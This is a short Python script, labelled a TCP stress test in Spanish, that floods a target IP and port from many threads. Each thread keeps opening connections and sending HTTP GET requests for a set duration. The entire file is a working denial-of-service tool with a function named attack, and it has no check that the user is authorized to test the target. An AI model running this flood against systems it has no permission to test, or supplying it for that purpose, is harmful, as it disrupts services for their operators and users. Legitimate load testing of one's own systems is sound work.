import threading
import socket
import time
import sys

def worker(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            s.close()
        except Exception:
            pass

def attack(ip: str, port: int, time_duration: int, num_threads: int = 50):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(ip, port, time_duration))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"Prueba de estrés TCP a {ip}:{port} finalizada.")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Uso: python3 tcpstress.py <target_ip> <port> <threads> <duration>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    test_duration = int(sys.argv[4])
    attack(target_ip, target_port, test_duration, num_threads)
